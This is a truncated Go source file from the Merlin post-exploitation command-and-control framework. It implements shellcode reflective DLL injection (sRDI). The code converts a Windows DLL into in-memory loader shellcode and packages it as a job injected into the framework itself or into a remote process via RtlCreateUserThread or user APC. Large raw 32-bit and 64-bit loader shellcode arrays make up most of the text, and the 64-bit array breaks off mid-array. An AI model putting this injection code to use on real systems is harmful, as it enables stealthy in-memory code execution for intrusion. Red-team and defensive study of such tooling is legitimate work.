/*
Merlin is a post-exploitation command and control framework.
This file is part of Merlin.
Copyright (C) 2019  Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

// Additional licenses for external programs and code libraries are at the end of the file
// Moved to the end of the file because it was generating IDE errors with that many lines of comment

package srdi

import (
	// Standard
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"math"
	"os"
	"strconv"
	"strings"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/modules/shellcode"
)

// Parse is the initial entry point for all extended modules. All validation checks and processing will be performed here
// The function input types are limited to strings and therefore require additional processing
func Parse(options map[string]string) ([]string, error) {
	// 1. Check to make sure all of the arguments are there
	// 2. Check each argument
	// "commands": [{{dll.Value}}", "{{clearHeader.Value}}", "{{function.Value}}", "{{args.Value}}", "{{pid.Value}}", "{{method.Value}}"]

	if len(options) != 6 {
		return nil, fmt.Errorf("6 arguments were expected, %d were provided", len(options))
	}

	// Check to make sure DLL file exists at provided path
	_, err := os.Stat(options["dll"])
	if os.IsNotExist(err) {
		return nil, fmt.Errorf("the provided directory does not exist: %s", options["dll"])
	}
	// Convert clearHeader to bool
	clearHeader, errClear := strconv.ParseBool(options["clearHeader"])
	if errClear != nil {
		return nil, fmt.Errorf("there was an error parsing %s to boolean:\r\n%s", options["clearHeader"], errClear.Error())
	}

	// Convert PID to integer
	if options["pid"] != "" {
		_, errPid := strconv.Atoi(options["pid"])
		if errPid != nil {
			return nil, fmt.Errorf("there was an error converting the PID to an integer:\r\n%s", errPid.Error())
		}
	}

	if strings.ToLower(options["method"]) != "self" && options["pid"] == "" {
		return nil, fmt.Errorf("a valid PID must be provided for any method except self")
	}

	// Verify Method is a valid type
	var method string
	switch strings.ToLower(options["method"]) {
	case "self":
		method = "self"
	case "remote":
		method = "remote"
	case "rtlcreateuserthread":
		method = "RtlCreateUserThread"
	case "userapc":
		method = "UserAPC"
	default:
		return nil, fmt.Errorf("invlaid shellcode execution method: %s", method)

	}
	// TODO add types as constant or list in shellcode.go

	sc, errShellcode := dllToReflectiveShellcode(options["dll"], options["function"], clearHeader, options["args"])
	if errShellcode != nil {
		return nil, errShellcode
	}
	b64 := base64.StdEncoding.EncodeToString(sc)
	command, errCommand := shellcode.GetJob(method, b64, options["pid"])
	if errCommand != nil {
		return nil, fmt.Errorf("there was an error getting the shellcode job:\r\n%s", errCommand.Error())
	}

	return command, nil
}

// dllToReflectiveShellcode will convert an existing Windows DLL to position independent shellcode that contains a reflective loader to load and execute the shellcode in-memory.
// The function code is adapted from the work by Leo Loobeek at:
// https://gist.githubusercontent.com/leoloobeek/c726719d25d7e7953d4121bd93dd2ed3/raw/05f20bae7aa6cd21e20a52034b9547a19e211c5e/ShellcodeRDI.go
// The work by Leo Loobeek is based on the sRDI project by Nick Landers (@monoxgas) at https://github.com/monoxgas/sRDI/
// The work done by Nick Landers is based on the work by Dan Staples which is based on the work by Stephen Fewer
// The work done by Nick Landers regarding Position Independent Code (PIC) is based on the work by Matthew Graeber
// The work done by Matthew Graeber is based on the work by Alan Turing
// Lastly, invoking the name of the Lee Christensen is used for good luck and pwnage
// dllPath is a the file path, as a string, of the source DLL to convert to reflective shellcode
// functionName is the name of the function to call after DllMain (optional)
// clearHeader will remove the PE header if set to true (optional)
// userDataStr is used to define any arguments that should be called with the injected DLL (optional)
func dllToReflectiveShellcode(dllPath string, functionName string, clearHeader bool, userDataStr string) ([]byte, error) {

	// TODO make sure file exists
	dllBytes, err := ioutil.ReadFile(dllPath) // #nosec G304 Intended functionality to allow users to specify arbitrary file
	if err != nil {
		return nil, err
	}

	var functionHash []byte

	if functionName != "" {
		hashFunctionUint32 := hashFunctionName(functionName)
		functionHash = pack(hashFunctionUint32)
	} else {
		functionHash = pack(uint32(0x10))
	}

	flags := 0

	if clearHeader {
		flags |= 0x1
	}

	var userData []byte
	if userDataStr != "" {
		userData = []byte(userDataStr)
	} else {
		userData = []byte("None")
	}

	rdiShellcode32 := []byte{0x83, 0xEC, 0x48, 0x83, 0x64, 0x24, 0x18, 0x00, 0xB9, 0x4C, 0x77, 0x26, 0x07, 0x53, 0x55, 0x56, 0x57, 0x33, 0xF6, 0xE8, 0x22, 0x04, 0x00, 0x00, 0xB9, 0x49, 0xF7, 0x02, 0x78, 0x89, 0x44, 0x24, 0x1C, 0xE8, 0x14, 0x04, 0x00, 0x00, 0xB9, 0x58, 0xA4, 0x53, 0xE5, 0x89, 0x44, 0x24, 0x20, 0xE8, 0x06, 0x04, 0x00, 0x00, 0xB9, 0x10, 0xE1, 0x8A, 0xC3, 0x8B, 0xE8, 0xE8, 0xFA, 0x03, 0x00, 0x00, 0xB9, 0xAF, 0xB1, 0x5C, 0x94, 0x89, 0x44, 0x24, 0x2C, 0xE8, 0xEC, 0x03, 0x00, 0x00, 0xB9, 0x33, 0x00, 0x9E, 0x95, 0x89, 0x44, 0x24, 0x30, 0xE8, 0xDE, 0x03, 0x00, 0x00, 0x8B, 0xD8, 0x8B, 0x44, 0x24, 0x5C, 0x8B, 0x78, 0x3C, 0x03, 0xF8, 0x89, 0x7C, 0x24, 0x10, 0x81, 0x3F, 0x50, 0x45, 0x00, 0x00, 0x74, 0x07, 0x33, 0xC0, 0xE9, 0xB8, 0x03, 0x00, 0x00, 0xB8, 0x4C, 0x01, 0x00, 0x00, 0x66, 0x39, 0x47, 0x04, 0x75, 0xEE, 0xF6, 0x47, 0x38, 0x01, 0x75, 0xE8, 0x0F, 0xB7, 0x57, 0x06, 0x0F, 0xB7, 0x47, 0x14, 0x85, 0xD2, 0x74, 0x22, 0x8D, 0x4F, 0x24, 0x03, 0xC8, 0x83, 0x79, 0x04, 0x00, 0x8B, 0x01, 0x75, 0x05, 0x03, 0x47, 0x38, 0xEB, 0x03, 0x03, 0x41, 0x04, 0x3B, 0xC6, 0x0F, 0x47, 0xF0, 0x83, 0xC1, 0x28, 0x83, 0xEA, 0x01, 0x75, 0xE3, 0x8D, 0x44, 0x24, 0x34, 0x50, 0xFF, 0xD3, 0x8B, 0x44, 0x24, 0x38, 0x8B, 0x5F, 0x50, 0x8D, 0x50, 0xFF, 0x8D, 0x48, 0xFF, 0xF7, 0xD2, 0x48, 0x03, 0xCE, 0x03, 0xC3, 0x23, 0xCA, 0x23, 0xC2, 0x3B, 0xC1, 0x75, 0x97, 0x6A, 0x04, 0x68, 0x00, 0x30, 0x00, 0x00, 0x53, 0x6A, 0x00, 0xFF, 0xD5, 0x8B, 0x77, 0x54, 0x8B, 0xD8, 0x8B, 0x44, 0x24, 0x5C, 0x33, 0xC9, 0x89, 0x44, 0x24, 0x14, 0x8B, 0xD3, 0x33, 0xC0, 0x89, 0x5C, 0x24, 0x18, 0x40, 0x89, 0x44, 0x24, 0x24, 0x85, 0xF6, 0x74, 0x37, 0x8B, 0x6C, 0x24, 0x6C, 0x8B, 0x5C, 0x24, 0x14, 0x23, 0xE8, 0x4E, 0x85, 0xED, 0x74, 0x19, 0x8B, 0xC7, 0x2B, 0x44, 0x24, 0x5C, 0x3B, 0xC8, 0x73, 0x0F, 0x83, 0xF9, 0x3C, 0x72, 0x05, 0x83, 0xF9, 0x3E, 0x76, 0x05, 0xC6, 0x02, 0x00, 0xEB, 0x04, 0x8A, 0x03, 0x88, 0x02, 0x41, 0x43, 0x42, 0x85, 0xF6, 0x75, 0xD7, 0x8B, 0x5C, 0x24, 0x18, 0x0F, 0xB7, 0x47, 0x06, 0x0F, 0xB7, 0x4F, 0x14, 0x85, 0xC0, 0x74, 0x38, 0x83, 0xC7, 0x2C, 0x03, 0xCF, 0x8B, 0x7C, 0x24, 0x5C, 0x8B, 0x51, 0xF8, 0x48, 0x8B, 0x31, 0x03, 0xD3, 0x8B, 0x69, 0xFC, 0x03, 0xF7, 0x89, 0x44, 0x24, 0x5C, 0x85, 0xED, 0x74, 0x0F, 0x8A, 0x06, 0x88, 0x02, 0x42, 0x46, 0x83, 0xED, 0x01, 0x75, 0xF5, 0x8B, 0x44, 0x24, 0x5C, 0x83, 0xC1, 0x28, 0x85, 0xC0, 0x75, 0xD5, 0x8B, 0x7C, 0x24, 0x10, 0x8B, 0xB7, 0x80, 0x00, 0x00, 0x00, 0x03, 0xF3, 0x89, 0x74, 0x24, 0x14, 0x8B, 0x46, 0x0C, 0x85, 0xC0, 0x74, 0x7D, 0x03, 0xC3, 0x50, 0xFF, 0x54, 0x24, 0x20, 0x8B, 0x6E, 0x10, 0x8B, 0xF8, 0x8B, 0x06, 0x03, 0xEB, 0x03, 0xC3, 0x89, 0x44, 0x24, 0x5C, 0x83, 0x7D, 0x00, 0x00, 0x74, 0x4F, 0x8B, 0x74, 0x24, 0x20, 0x8B, 0x08, 0x85, 0xC9, 0x74, 0x1E, 0x79, 0x1C, 0x8B, 0x47, 0x3C, 0x0F, 0xB7, 0xC9, 0x8B, 0x44, 0x38, 0x78, 0x2B, 0x4C, 0x38, 0x10, 0x8B, 0x44, 0x38, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x38, 0x03, 0xC7, 0xEB, 0x0C, 0x8B, 0x45, 0x00, 0x83, 0xC0, 0x02, 0x03, 0xC3, 0x50, 0x57, 0xFF, 0xD6, 0x89, 0x45, 0x00, 0x83, 0xC5, 0x04, 0x8B, 0x44, 0x24, 0x5C, 0x83, 0xC0, 0x04, 0x89, 0x44, 0x24, 0x5C, 0x83, 0x7D, 0x00, 0x00, 0x75, 0xB9, 0x8B, 0x74, 0x24, 0x14, 0x8B, 0x46, 0x20, 0x83, 0xC6, 0x14, 0x89, 0x74, 0x24, 0x14, 0x85, 0xC0, 0x75, 0x87, 0x8B, 0x7C, 0x24, 0x10, 0x8B, 0xEB, 0x2B, 0x6F, 0x34, 0x83, 0xBF, 0xA4, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xAA, 0x00, 0x00, 0x00, 0x8B, 0x97, 0xA0, 0x00, 0x00, 0x00, 0x03, 0xD3, 0x89, 0x54, 0x24, 0x5C, 0x8D, 0x4A, 0x04, 0x8B, 0x01, 0x89, 0x4C, 0x24, 0x14, 0x85, 0xC0, 0x0F, 0x84, 0x8D, 0x00, 0x00, 0x00, 0x8B, 0x32, 0x8D, 0x78, 0xF8, 0x03, 0xF3, 0x8D, 0x42, 0x08, 0xD1, 0xEF, 0x89, 0x44, 0x24, 0x20, 0x74, 0x60, 0x6A, 0x02, 0x8B, 0xD8, 0x5A, 0x0F, 0xB7, 0x0B, 0x4F, 0x66, 0x8B, 0xC1, 0x66, 0xC1, 0xE8, 0x0C, 0x66, 0x83, 0xF8, 0x0A, 0x74, 0x06, 0x66, 0x83, 0xF8, 0x03, 0x75, 0x0B, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00, 0x01, 0x2C, 0x31, 0xEB, 0x27, 0x66, 0x3B, 0x44, 0x24, 0x24, 0x75, 0x11, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00, 0x8B, 0xC5, 0xC1, 0xE8, 0x10, 0x66, 0x01, 0x04, 0x31, 0xEB, 0x0F, 0x66, 0x3B, 0xC2, 0x75, 0x0A, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00, 0x66, 0x01, 0x2C, 0x31, 0x03, 0xDA, 0x85, 0xFF, 0x75, 0xB1, 0x8B, 0x5C, 0x24, 0x18, 0x8B, 0x54, 0x24, 0x5C, 0x8B, 0x4C, 0x24, 0x14, 0x03, 0x11, 0x89, 0x54, 0x24, 0x5C, 0x8D, 0x4A, 0x04, 0x8B, 0x01, 0x89, 0x4C, 0x24, 0x14, 0x85, 0xC0, 0x0F, 0x85, 0x77, 0xFF, 0xFF, 0xFF, 0x8B, 0x7C, 0x24, 0x10, 0x0F, 0xB7, 0x47, 0x06, 0x0F, 0xB7, 0x4F, 0x14, 0x85, 0xC0, 0x0F, 0x84, 0xB7, 0x00, 0x00, 0x00, 0x8B, 0x74, 0x24, 0x5C, 0x8D, 0x6F, 0x3C, 0x03, 0xE9, 0x48, 0x83, 0x7D, 0xEC, 0x00, 0x89, 0x44, 0x24, 0x24, 0x0F, 0x86, 0x94, 0x00, 0x00, 0x00, 0x8B, 0x4D, 0x00, 0x33, 0xD2, 0x42, 0x8B, 0xC1, 0xC1, 0xE8, 0x1D, 0x23, 0xC2, 0x8B, 0xD1, 0xC1, 0xEA, 0x1E, 0x83, 0xE2, 0x01, 0xC1, 0xE9, 0x1F, 0x85, 0xC0, 0x75, 0x18, 0x85, 0xD2, 0x75, 0x07, 0x6A, 0x08, 0x5E, 0x6A, 0x01, 0xEB, 0x05, 0x6A, 0x04, 0x5E, 0x6A, 0x02, 0x85, 0xC9, 0x58, 0x0F, 0x44, 0xF0, 0xEB, 0x2C, 0x85, 0xD2, 0x75, 0x17, 0x85, 0xC9, 0x75, 0x04, 0x6A, 0x10, 0xEB, 0x15, 0x85, 0xD2, 0x75, 0x0B, 0x85, 0xC9, 0x74, 0x18, 0xBE, 0x80, 0x00, 0x00, 0x00, 0xEB, 0x11, 0x85, 0xC9, 0x75, 0x05, 0x6A, 0x20, 0x5E, 0xEB, 0x08, 0x6A, 0x40, 0x85, 0xC9, 0x58, 0x0F, 0x45, 0xF0, 0x8B, 0x4D, 0x00, 0x8B, 0xC6, 0x0D, 0x00, 0x02, 0x00, 0x00, 0x81, 0xE1, 0x00, 0x00, 0x00, 0x04, 0x0F, 0x44, 0xC6, 0x8B, 0xF0, 0x8D, 0x44, 0x24, 0x28, 0x50, 0x8B, 0x45, 0xE8, 0x56, 0xFF, 0x75, 0xEC, 0x03, 0xC3, 0x50, 0xFF, 0x54, 0x24, 0x3C, 0x85, 0xC0, 0x0F, 0x84, 0xEC, 0xFC, 0xFF, 0xFF, 0x8B, 0x44, 0x24, 0x24, 0x83, 0xC5, 0x28, 0x85, 0xC0, 0x0F, 0x85, 0x52, 0xFF, 0xFF, 0xFF, 0x8B, 0x77, 0x28, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0xFF, 0x03, 0xF3, 0xFF, 0x54, 0x24, 0x3C, 0x33, 0xC0, 0x40, 0x50, 0x50, 0x53, 0xFF, 0xD6, 0x83, 0x7C, 0x24, 0x60, 0x00, 0x74, 0x7C, 0x83, 0x7F, 0x7C, 0x00, 0x74, 0x76, 0x8B, 0x4F, 0x78, 0x03, 0xCB, 0x8B, 0x41, 0x18, 0x85, 0xC0, 0x74, 0x6A, 0x83, 0x79, 0x14, 0x00, 0x74, 0x64, 0x8B, 0x69, 0x20, 0x8B, 0x79, 0x24, 0x03, 0xEB, 0x83, 0x64, 0x24, 0x5C, 0x00, 0x03, 0xFB, 0x85, 0xC0, 0x74, 0x51, 0x8B, 0x75, 0x00, 0x03, 0xF3, 0x33, 0xD2, 0x0F, 0xBE, 0x06, 0xC1, 0xCA, 0x0D, 0x03, 0xD0, 0x46, 0x80, 0x7E, 0xFF, 0x00, 0x75, 0xF1, 0x39, 0x54, 0x24, 0x60, 0x74, 0x16, 0x8B, 0x44, 0x24, 0x5C, 0x83, 0xC5, 0x04, 0x40, 0x83, 0xC7, 0x02, 0x89, 0x44, 0x24, 0x5C, 0x3B, 0x41, 0x18, 0x72, 0xD0, 0xEB, 0x1F, 0x0F, 0xB7, 0x17, 0x83, 0xFA, 0xFF, 0x74, 0x17, 0x8B, 0x41, 0x1C, 0xFF, 0x74, 0x24, 0x68, 0xFF, 0x74, 0x24, 0x68, 0x8D, 0x04, 0x90, 0x8B, 0x04, 0x18, 0x03, 0xC3, 0xFF, 0xD0, 0x59, 0x59, 0x8B, 0xC3, 0x5F, 0x5E, 0x5D, 0x5B, 0x83, 0xC4, 0x48, 0xC3, 0x83, 0xEC, 0x10, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x53, 0x55, 0x56, 0x8B, 0x40, 0x0C, 0x57, 0x89, 0x4C, 0x24, 0x18, 0x8B, 0x70, 0x0C, 0xE9, 0x8A, 0x00, 0x00, 0x00, 0x8B, 0x46, 0x30, 0x33, 0xC9, 0x8B, 0x5E, 0x2C, 0x8B, 0x36, 0x89, 0x44, 0x24, 0x14, 0x8B, 0x42, 0x3C, 0x8B, 0x6C, 0x10, 0x78, 0x89, 0x6C, 0x24, 0x10, 0x85, 0xED, 0x74, 0x6D, 0xC1, 0xEB, 0x10, 0x33, 0xFF, 0x85, 0xDB, 0x74, 0x1F, 0x8B, 0x6C, 0x24, 0x14, 0x8A, 0x04, 0x2F, 0xC1, 0xC9, 0x0D, 0x3C, 0x61, 0x0F, 0xBE, 0xC0, 0x7C, 0x03, 0x83, 0xC1, 0xE0, 0x03, 0xC8, 0x47, 0x3B, 0xFB, 0x72, 0xE9, 0x8B, 0x6C, 0x24, 0x10, 0x8B, 0x44, 0x2A, 0x20, 0x33, 0xDB, 0x8B, 0x7C, 0x2A, 0x18, 0x03, 0xC2, 0x89, 0x7C, 0x24, 0x14, 0x85, 0xFF, 0x74, 0x31, 0x8B, 0x28, 0x33, 0xFF, 0x03, 0xEA, 0x83, 0xC0, 0x04, 0x89, 0x44, 0x24, 0x1C, 0x0F, 0xBE, 0x45, 0x00, 0xC1, 0xCF, 0x0D, 0x03, 0xF8, 0x45, 0x80, 0x7D, 0xFF, 0x00, 0x75, 0xF0, 0x8D, 0x04, 0x0F, 0x3B, 0x44, 0x24, 0x18, 0x74, 0x20, 0x8B, 0x44, 0x24, 0x1C, 0x43, 0x3B, 0x5C, 0x24, 0x14, 0x72, 0xCF, 0x8B, 0x56, 0x18, 0x85, 0xD2, 0x0F, 0x85, 0x6B, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x5F, 0x5E, 0x5D, 0x5B, 0x83, 0xC4, 0x10, 0xC3, 0x8B, 0x74, 0x24, 0x10, 0x8B, 0x44, 0x16, 0x24, 0x8D, 0x04, 0x58, 0x0F, 0xB7, 0x0C, 0x10, 0x8B, 0x44, 0x16, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x10, 0x03, 0xC2, 0xEB, 0xDB}
	rdiShellcode64 := []byte{0x48, 0x8B, 0xC4, 0x44, 0x89, 0x48, 0x20, 0x4C, 0x89, 0x40, 0x18, 0x89, 0x50, 0x10, 0x53, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x78, 0x83, 0x60, 0x08, 0x00, 0x48, 0x8B, 0xE9, 0xB9, 0x4C, 0x77, 0x26, 0x07, 0x44, 0x8B, 0xFA, 0x33, 0xDB, 0xE8, 0xA4, 0x04, 0x00, 0x00, 0xB9, 0x49, 0xF7, 0x02, 0x78, 0x4C, 0x8B, 0xE8, 0xE8, 0x97, 0x04, 0x00, 0x00, 0xB9, 0x58, 0xA4, 0x53, 0xE5, 0x48, 0x89, 0x44, 0x24, 0x20, 0xE8, 0x88, 0x04, 0x00, 0x00, 0xB9, 0x10, 0xE1, 0x8A, 0xC3, 0x48, 0x8B, 0xF0, 0xE8, 0x7B, 0x04, 0x00, 0x00, 0xB9, 0xAF, 0xB1, 0x5C, 0x94, 0x48, 0x89, 0x44, 0x24, 0x30, 0xE8, 0x6C, 0x04, 0x00, 0x00, 0xB9, 0x33, 0x00, 0x9E, 0x95, 0x48, 0x89, 0x44, 0x24, 0x28, 0x4C, 0x8B, 0xE0, 0xE8, 0x5A, 0x04, 0x00, 0x00, 0x48, 0x63, 0x7D, 0x3C, 0x4C, 0x8B, 0xD0, 0x48, 0x03, 0xFD, 0x81, 0x3F, 0x50, 0x45, 0x00, 0x00, 0x74, 0x07, 0x33, 0xC0, 0xE9, 0x2D, 0x04, 0x00, 0x00, 0xB8, 0x64, 0x86, 0x00, 0x00, 0x66, 0x39, 0x47, 0x04, 0x75, 0xEE, 0x41, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x44, 0x84, 0x77, 0x38, 0x75, 0xE2, 0x0F, 0xB7, 0x47, 0x06, 0x0F, 0xB7, 0x4F, 0x14, 0x44, 0x8B, 0x4F, 0x38, 0x85, 0xC0, 0x74, 0x2C, 0x48, 0x8D, 0x57, 0x24, 0x44, 0x8B, 0xC0, 0x48, 0x03, 0xD1, 0x8B, 0x4A, 0x04, 0x85, 0xC9, 0x75, 0x07, 0x8B, 0x02, 0x49, 0x03, 0xC1, 0xEB, 0x04, 0x8B, 0x02, 0x03, 0xC1, 0x48, 0x3B, 0xC3, 0x48, 0x0F, 0x47, 0xD8, 0x48, 0x83, 0xC2, 0x28, 0x4D, 0x2B, 0xC6, 0x75, 0xDE, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0x41, 0xFF, 0xD2, 0x44, 0x8B, 0x44, 0x24, 0x3C, 0x44, 0x8B, 0x4F, 0x50, 0x41, 0x8D, 0x40, 0xFF, 0xF7, 0xD0, 0x41, 0x8D, 0x50, 0xFF, 0x41, 0x03, 0xD1, 0x49, 0x8D, 0x48, 0xFF, 0x48, 0x23, 0xD0, 0x48, 0x03, 0xCB, 0x49, 0x8D, 0x40, 0xFF, 0x48, 0xF7, 0xD0, 0x48, 0x23, 0xC8, 0x48, 0x3B, 0xD1, 0x0F, 0x85, 0x6B, 0xFF, 0xFF, 0xFF, 0x33, 0xC9, 0x41, 0x8B, 0xD1, 0x41, 0xB8, 0x00, 0x30, 0x00, 0x00, 0x44, 0x8D, 0x49, 0x04, 0xFF, 0xD6, 0x44, 0x8B, 0x47, 0x54, 0x33, 0xD2, 0x48, 0x8B, 0xF0, 0x4C, 0x8B, 0xD5, 0x48, 0x8B, 0xC8, 0x44, 0x8D, 0x5A, 0x02, 0x4D, 0x85, 0xC0, 0x74, 0x3F, 0x44, 0x8B, 0x8C, 0x24, 0xE0, 0x00, 0x00, 0x00, 0x45, 0x23, 0xCE, 0x4D, 0x2B, 0xC6, 0x45, 0x85, 0xC9, 0x74, 0x19, 0x48, 0x8B, 0xC7, 0x48, 0x2B, 0xC5, 0x48, 0x3B, 0xD0, 0x73, 0x0E, 0x48, 0x8D, 0x42, 0xC4, 0x49, 0x3B, 0xC3, 0x76, 0x05, 0xC6, 0x01, 0x00, 0xEB, 0x05, 0x41, 0x8A, 0x02, 0x88, 0x01, 0x49, 0x03, 0xD6, 0x4D, 0x03, 0xD6, 0x49, 0x03, 0xCE, 0x4D, 0x85, 0xC0, 0x75, 0xCC, 0x44, 0x0F, 0xB7, 0x57, 0x06, 0x0F, 0xB7, 0x47, 0x14, 0x4D, 0x85, 0xD2, 0x74, 0x38, 0x48, 0x8D, 0x4F, 0x2C, 0x48, 0x03, 0xC8, 0x8B, 0x51, 0xF8, 0x4D, 0x2B, 0xD6, 0x44, 0x8B, 0x01, 0x48, 0x03, 0xD6, 0x44, 0x8B, 0x49, 0xFC, 0x4C, 0x03, 0xC5, 0x4D, 0x85, 0xC9, 0x74, 0x10, 0x41, 0x8A, 0x00, 0x4D, 0x03, 0xC6, 0x88, 0x02, 0x49, 0x03, 0xD6, 0x4D, 0x2B, 0xCE, 0x75, 0xF0, 0x48, 0x83, 0xC1, 0x28, 0x4D, 0x85, 0xD2, 0x75, 0xCF, 0x8B, 0x9F, 0x90, 0x00, 0x00, 0x00, 0x48, 0x03, 0xDE, 0x8B, 0x43, 0x0C, 0x85, 0xC0, 0x0F, 0x84, 0x8A, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x6C, 0x24, 0x20, 0x8B, 0xC8, 0x48, 0x03, 0xCE, 0x41, 0xFF, 0xD5, 0x44, 0x8B, 0x3B, 0x4C, 0x8B, 0xE0, 0x44, 0x8B, 0x73, 0x10, 0x4C, 0x03, 0xFE, 0x4C, 0x03, 0xF6, 0xEB, 0x49, 0x49, 0x83, 0x3F, 0x00, 0x7D, 0x29, 0x49, 0x63, 0x44, 0x24, 0x3C, 0x41, 0x0F, 0xB7, 0x17, 0x42, 0x8B, 0x8C, 0x20, 0x88, 0x00, 0x00, 0x00, 0x42, 0x8B, 0x44, 0x21, 0x10, 0x42, 0x8B, 0x4C, 0x21, 0x1C, 0x48, 0x2B, 0xD0, 0x49, 0x03, 0xCC, 0x8B, 0x04, 0x91, 0x49, 0x03, 0xC4, 0xEB, 0x0F, 0x49, 0x8B, 0x16, 0x49, 0x8B, 0xCC, 0x48, 0x83, 0xC2, 0x02, 0x48, 0x03, 0xD6, 0xFF, 0xD5, 0x49, 0x89, 0x06, 0x49, 0x83, 0xC6, 0x08, 0x49, 0x83, 0xC7, 0x08, 0x49, 0x83, 0x3E, 0x00, 0x75, 0xB1, 0x8B, 0x43, 0x20, 0x48, 0x83, 0xC3, 0x14, 0x85, 0xC0, 0x75, 0x8C, 0x44, 0x8B, 0xBC, 0x24, 0xC8, 0x00, 0x00, 0x00, 0x44, 0x8D, 0x70, 0x01, 0x4C, 0x8B, 0x64, 0x24, 0x28, 0x4C, 0x8B, 0xCE, 0x41, 0xBD, 0x02, 0x00, 0x00, 0x00, 0x4C, 0x2B, 0x4F, 0x30, 0x83, 0xBF, 0xB4, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x95, 0x00, 0x00, 0x00, 0x8B, 0x97, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x03, 0xD6, 0x8B, 0x42, 0x04, 0x85, 0xC0, 0x0F, 0x84, 0x81, 0x00, 0x00, 0x00, 0xBB, 0xFF, 0x0F, 0x00, 0x00, 0x44, 0x8B, 0x02, 0x4C, 0x8D, 0x5A, 0x08, 0x44, 0x8B, 0xD0, 0x4C, 0x03, 0xC6, 0x49, 0x83, 0xEA, 0x08, 0x49, 0xD1, 0xEA, 0x74, 0x59, 0x41, 0x0F, 0xB7, 0x0B, 0x4D, 0x2B, 0xD6, 0x0F, 0xB7, 0xC1, 0x66, 0xC1, 0xE8, 0x0C, 0x66, 0x83, 0xF8, 0x0A, 0x75, 0x09, 0x48, 0x23, 0xCB, 0x4E, 0x01, 0x0C, 0x01, 0xEB, 0x34, 0x66, 0x83, 0xF8, 0x03, 0x75, 0x09, 0x48, 0x23, 0xCB, 0x46, 0x01, 0x0C, 0x01, 0xEB, 0x25, 0x66, 0x41, 0x3B, 0xC6, 0x75, 0x11, 0x48, 0x23, 0xCB, 0x49, 0x8B, 0xC1, 0x48, 0xC1, 0xE8, 0x10, 0x66, 0x42, 0x01, 0x04, 0x01, 0xEB, 0x0E, 0x66, 0x41, 0x3B, 0xC5, 0x75, 0x08, 0x48, 0x23, 0xCB, 0x66, 0x46, 0x01, 0x0C, 0x01, 0x4D, 0x03, 0xDD, 0x4D, 0x85, 0xD2, 0x75, 0xA7, 0x8B, 0x42, 0x04, 0x48, 0x03, 0xD0, 0x8B, 0x42, 0x04, 0x85, 0xC0, 0x75, 0x84, 0x0F, 0xB7, 0x6F, 0x06, 0x0F, 0xB7, 0x47, 0x14, 0x48, 0x85, 0xED, 0x0F, 0x84, 0xCF, 0x00, 0x00, 0x00, 0x8B, 0x9C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x77, 0x3C, 0x4C, 0x8B, 0x6C, 0x24, 0x30, 0x4C, 0x03, 0xF0, 0x48, 0xFF, 0xCD, 0x41, 0x83, 0x7E, 0xEC, 0x00, 0x0F, 0x86, 0x9D, 0x00, 0x00, 0x00, 0x45, 0x8B, 0x06, 0x41, 0x8B, 0xD0, 0xC1, 0xEA, 0x1E, 0x41, 0x8B, 0xC0, 0x41, 0x8B, 0xC8, 0xC1, 0xE8, 0x1D, 0x83, 0xE2, 0x01, 0xC1, 0xE9, 0x1F, 0x83, 0xE0, 0x01, 0x75, 0x1E, 0x85, 0xD2, 0x75, 0x0B, 0xF7, 0xD9, 0x1B, 0xDB, 0x83, 0xE3, 0x07, 0xFF, 0xC3, 0xEB, 0x3E, 0xF7, 0xD9, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x1B, 0xDB, 0x23, 0xD8, 0x03, 0xD8, 0xEB, 0x2F, 0x85, 0xD2, 0x75, 0x18, 0x85, 0xC9, 0x75, 0x05, 0x8D, 0x5A, 0x10, 0xEB, 0x22, 0x85, 0xD2, 0x75, 0x0B, 0x85, 0xC9, 0x74, 0x1A, 0xBB, 0x80, 0x00, 0x00, 0x00, 0xEB, 0x13, 0x85, 0xC9, 0x75, 0x05, 0x8D, 0x59, 0x20, 0xEB, 0x0A, 0x85, 0xC9, 0xB8, 0x40, 0x00, 0x00, 0x00, 0x0F, 0x45, 0xD8, 0x41, 0x8B, 0x4E, 0xE8, 0x4C, 0x8D, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x8B, 0x56, 0xEC, 0x8B, 0xC3, 0x0F, 0xBA, 0xE8, 0x09, 0x41, 0x81, 0xE0, 0x00, 0x00, 0x00, 0x04, 0x0F, 0x44, 0xC3, 0x48, 0x03, 0xCE, 0x44, 0x8B, 0xC0, 0x8B, 0xD8, 0x41, 0xFF, 0xD5, 0x85, 0xC0, 0x0F, 0x84, 0xA1, 0xFC, 0xFF, 0xFF, 0x49, 0x83, 0xC6, 0x28, 0x48, 0x85, 0xED, 0x0F, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x44, 0x8D, 0x6D, 0x02, 0x8B, 0x5F, 0x28, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x83, 0xC9, 0xFF, 0x48, 0x03, 0xDE, 0x41, 0xFF, 0xD4, 0xBD, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCE, 0x44, 0x8B, 